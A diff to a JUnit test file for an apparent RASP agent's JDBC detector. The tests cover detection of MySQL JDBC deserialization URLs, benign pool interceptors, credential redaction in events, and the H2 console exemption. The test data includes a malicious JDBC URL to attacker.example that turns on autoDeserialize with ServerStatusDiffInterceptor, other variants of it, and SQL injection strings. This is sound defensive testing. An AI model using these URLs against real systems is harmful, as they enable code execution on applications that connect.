@@ -4,6 +4,7 @@ import static io.ohmyrasp.agent.detect.DetectorTestSupport.assertAlgorithm;
 import static io.ohmyrasp.agent.detect.DetectorTestSupport.jsonString;
 import static io.ohmyrasp.agent.detect.DetectorTestSupport.request;
 import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import io.ohmyrasp.agent.model.RequestContext;
@@ -275,14 +276,56 @@ final class JdbcDetectorTest {
     assertAlgorithm(result, "jdbc_mysql_deserialization");
   }
 
+  /** Decided whoever chose the URL, as on the backport lines; request control only raises the confidence. */
   @Test
-  void ignoresMysqlJdbcDeserializationUrlWithoutRequestControl() {
+  void detectsMysqlJdbcDeserializationUrlWithoutRequestControl() {
     String url =
         "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";
 
-    var result = JdbcDetector.detectJdbcUrl(url, request());
+    var inRequest = JdbcDetector.detectJdbcUrl(url, request());
+    var background = JdbcDetector.detectJdbcUrl(url, RequestContext.empty());
 
-    assertTrue(result.isEmpty());
+    assertAlgorithm(inRequest, "jdbc_mysql_deserialization");
+    assertEquals(92, inRequest.orElseThrow().confidence());
+    assertAlgorithm(background, "jdbc_mysql_deserialization");
+  }
+
+  /**
+   * autoDeserialize with an interceptor of the pool's own is not the exploit: only ServerStatusDiffInterceptor, or
+   * detectCustomCollations, makes the driver read the server's bytes at connect time.
+   */
+  @Test
+  void aPoolsOwnInterceptorBesideAutoDeserializeIsNotReported() {
+    for (String url : List.of(
+        "jdbc:mysql://db.internal:3306/app?autoDeserialize=true&queryInterceptors=com.example.TracingInterceptor",
+        "jdbc:mysql://db.internal:3306/app?autoDeserialize=true",
+        "jdbc:mysql://db.internal:3306/app?autoDeserialize=false&queryInterceptors="
+            + "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
+        "jdbc:postgresql://db.internal/app?autoDeserialize=true&detectCustomCollations=true",
+        // Separators percent-encoded: Connector/J 8.0.33 and 5.1.49 split the query before decoding and read no
+        // option from it (MysqlDeserializationUrlDriverTest), so the driver does not deserialize.
+        "jdbc:mysql://db/app?autoDeserialize%3Dtrue%26queryInterceptors%3Dcom.mysql.cj.jdbc.interceptors."
+            + "ServerStatusDiffInterceptor")) {
+      assertTrue(JdbcDetector.detectJdbcUrl(url, RequestContext.empty()).isEmpty(), url);
+    }
+    for (String url : List.of(
+        "jdbc:mysql://db/app?autoDeserialize=true&detectCustomCollations=true",
+        "jdbc:mysql://db/app?autoDeserialize = true&statementInterceptors = "
+            + "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor")) {
+      assertAlgorithm(JdbcDetector.detectJdbcUrl(url, RequestContext.empty()), "jdbc_mysql_deserialization");
+    }
+  }
+
+  /** The event names the driver, the host and the options; never the URL, whose credentials a pool configured. */
+  @Test
+  void theMysqlEventNamesTheOptionsAndNeverTheUrl() {
+    String url = "jdbc:mysql://reporter:Sentinel-Pw-9@db.internal:3306/app?password=Sentinel-Pw-9&autoDeserialize=true"
+        + "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
+
+    var details = JdbcDetector.detectJdbcUrl(url, RequestContext.empty()).orElseThrow().details();
+
+    assertEquals(Map.of("driver", "mysql", "host", "db.internal:3306",
+        "options", "autoDeserialize+ServerStatusDiffInterceptor"), details);
   }
 
   @Test
@@ -308,5 +351,18 @@ final class JdbcDetectorTest {
     assertAlgorithm(JdbcDetector.detectSql("select id from orders where id = 42 -- and active", context),
         "sql_userinput");
     assertTrue(JdbcDetector.detectSql("select id from orders where reference = '42 --'", context).isEmpty());
+  }
+
+  /** The H2 console submits its editor's SELECT as a request parameter: a body field is not that source. */
+  @Test
+  void theConsoleExemptionReadsTheRequestParametersAndNoBodyField() {
+    RequestContext request = new RequestContext("POST", "/h2-console/query.do", "",
+        java.util.Map.of("sql", java.util.List.of("SELECT * FROM t WHERE 1=1 OR 1=1")), java.util.Map.of(),
+        "{\"sql\":\"SELECT * FROM u WHERE 1=1 OR 1=1\"}");
+    java.util.List<String> inputs = JdbcDetector.consoleInputs(request);
+    assertTrue(inputs.contains("SELECT * FROM t WHERE 1=1 OR 1=1"), inputs.toString());
+    assertTrue(request.inputParameters().get("sql").contains("SELECT * FROM u WHERE 1=1 OR 1=1"),
+        "the body's field is a request input for the sink rules");
+    assertFalse(inputs.contains("SELECT * FROM u WHERE 1=1 OR 1=1"), "but not for the console's exemption: " + inputs);
   }
 }
